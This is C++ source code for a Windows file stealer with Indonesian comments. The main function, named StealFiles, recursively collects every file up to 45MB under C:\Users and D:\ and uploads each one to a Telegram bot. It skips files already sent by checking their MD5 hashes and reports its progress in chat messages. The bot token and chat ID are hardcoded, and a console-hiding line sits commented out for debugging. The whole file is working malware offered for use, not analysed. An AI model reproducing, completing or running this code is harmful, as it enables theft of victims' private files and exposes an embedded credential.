#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <filesystem>
#include <windows.h>
#include <winhttp.h>
#include <bcrypt.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "bcrypt.lib")

namespace fs = std::filesystem;

// ================= KONFIGURASI =================
const std::wstring BOT_TOKEN = L"8283354389:AAFR0ZXsnQ_7GhT_r_yHKcd9aypqlLCcvJ0";
const std::wstring CHAT_ID   = L"8275632263"; 
const uintmax_t MAX_SIZE     = 45 * 1024 * 1024; // 45MB
const std::string TRACK_FILE = "sent_hashes.txt";
// ===============================================

// Fungsi Hash MD5
std::string GetMD5(const std::string& filepath) {
    BCRYPT_ALG_HANDLE hAlg = NULL; BCRYPT_HASH_HANDLE hHash = NULL;
    DWORD cbData = 0, cbHash = 0, cbHashObject = 0;
    PBYTE pbHashObject = NULL, pbHash = NULL; std::string result = "";
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_MD5_ALGORITHM, NULL, 0) == 0) {
        BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbHashObject, sizeof(DWORD), &cbData, 0);
        BCryptGetProperty(hAlg, BCRYPT_HASH_LENGTH, (PBYTE)&cbHash, sizeof(DWORD), &cbData, 0);
        pbHashObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbHashObject);
        pbHash = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbHash);
        std::ifstream file(filepath, std::ios::binary);
        if (file.is_open()) {
            if (BCryptCreateHash(hAlg, &hHash, pbHashObject, cbHashObject, NULL, 0, 0) == 0) {
                char buffer[8192];
                while (file.read(buffer, sizeof(buffer)) || file.gcount() > 0) {
                    BCryptHashData(hHash, (PBYTE)buffer, file.gcount(), 0);
                }
                BCryptFinishHash(hHash, pbHash, cbHash, 0);
                char hex[33];
                for (int i = 0; i < (int)cbHash; i++) sprintf(hex + (i * 2), "%02x", pbHash[i]);
                result = std::string(hex);
                BCryptDestroyHash(hHash);
            }
            file.close();
        }
        if (pbHashObject) HeapFree(GetProcessHeap(), 0, pbHashObject);
        if (pbHash) HeapFree(GetProcessHeap(), 0, pbHash);
        BCryptCloseAlgorithmProvider(hAlg, 0);
    }
    return result;
}

// Fungsi Bantuan untuk Konversi String
std::wstring StringToWString(const std::string& str) {
    return std::wstring(str.begin(), str.end());
}

// Fungsi Kirim Pesan Teks (Debug)
void SendTelegramMessage(const std::string& msg) {
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    std::wstring path = L"/bot" + BOT_TOKEN + L"/sendMessage?chat_id=" + CHAT_ID + L"&text=" + StringToWString(msg);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0);
    WinHttpReceiveResponse(hRequest, NULL);
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
}

// ==========================================
// FUNGSI UPLOAD FILE (STREAMING - ANTI GAGAL)
// ==========================================
void UploadFileToTelegram(const std::string& filepath) {
    std::string filename = fs::path(filepath).filename().string();
    std::wstring wfilename = StringToWString(filename);
    
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    std::wstring path = L"/bot" + BOT_TOKEN + L"/sendDocument";
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

    // Siapkan Boundary
    std::wstring boundary = L"----WebKitFormBoundary" + std::to_wstring(GetTickCount64());
    std::wstring contentType = L"multipart/form-data; boundary=" + boundary;
    WinHttpAddRequestHeaders(hRequest, (L"Content-Type: " + contentType).c_str(), -1L, WINHTTP_ADDREQ_FLAG_ADD);

    // Hitung ukuran total data yang akan dikirim (Header + File + Footer)
    uintmax_t fileSize = fs::file_size(filepath);
    std::string headerPart = "--" + std::string(boundary.begin(), boundary.end()) + "\r\n"
        + "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + std::string(CHAT_ID.begin(), CHAT_ID.end()) + "\r\n"
        + "--" + std::string(boundary.begin(), boundary.end()) + "\r\n"
        + "Content-Disposition: form-data; name=\"document\"; filename=\"" + filename + "\"\r\n"
        + "Content-Type: application/octet-stream\r\n\r\n";
    std::string footerPart = "\r\n--" + std::string(boundary.begin(), boundary.end()) + "--\r\n";
    uintmax_t totalSize = headerPart.size() + fileSize + footerPart.size();

    // Kirim Request Awal
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, (DWORD)totalSize, 0)) {
        SendTelegramMessage("Gagal: WinHttpSendRequest");
        return;
    }

    // Tulis Header (chat_id)
    DWORD bytesWritten = 0;
    WinHttpWriteData(hRequest, headerPart.c_str(), (DWORD)headerPart.size(), &bytesWritten);

    // Tulis Isi File (Streaming per 8KB)
    std::ifstream file(filepath, std::ios::binary);
    char buffer[8192];
    while (file.read(buffer, sizeof(buffer)) || file.gcount() > 0) {
        WinHttpWriteData(hRequest, buffer, (DWORD)file.gcount(), &bytesWritten);
    }
    file.close();

    // Tulis Footer
    WinHttpWriteData(hRequest, footerPart.c_str(), (DWORD)footerPart.size(), &bytesWritten);

    // Terima Respon
    if (WinHttpReceiveResponse(hRequest, NULL)) {
        DWORD statusCode = 0; DWORD dwSize = sizeof(statusCode);
        WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &dwSize, WINHTTP_NO_HEADER_INDEX);
        if (statusCode != 200) {
            SendTelegramMessage("Gagal Upload: " + filename + " | Code: " + std::to_string(statusCode));
        }
    } else {
        SendTelegramMessage("Gagal: WinHttpReceiveResponse");
    }

    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
}

// ==========================================
// FUNGSI UTAMA
// ==========================================
void StealFiles() {
    std::vector<std::string> sentHashes;
    std::ifstream track(TRACK_FILE);
    std::string line;
    while (std::getline(track, line)) sentHashes.push_back(line);
    track.close();
    std::ofstream trackAppend(TRACK_FILE, std::ios::app);

    std::vector<std::string> targets = { "C:\\Users", "D:\\" };

    for (const auto& target : targets) {
        if (!fs::exists(target)) continue;
        try {
            for (const auto& entry : fs::recursive_directory_iterator(target, fs::directory_options::skip_permission_denied)) {
                if (!entry.is_regular_file()) continue;
                uintmax_t size = entry.file_size();
                if (size == 0 || size > MAX_SIZE) continue;

                std::string pathStr = entry.path().string();
                std::string hash = GetMD5(pathStr);
                
                bool alreadySent = false;
                for (const auto& h : sentHashes) {
                    if (h == hash) { alreadySent = true; break; }
                }
                if (alreadySent) continue;

                UploadFileToTelegram(pathStr);
                trackAppend << hash << "\n";
                sentHashes.push_back(hash);
            }
        } catch (...) {}
    }
    trackAppend.close();
}

int main() {
    // HAPUS BARIS INI UNTUK SEMENTARA BIAR ERROR KELIATAN
    // ShowWindow(GetConsoleWindow(), SW_HIDE); 
    
    SendTelegramMessage("Stealer Berjalan: Memulai Scan...");
    StealFiles();
    SendTelegramMessage("Stealer Selesai.");
    return 0;
}
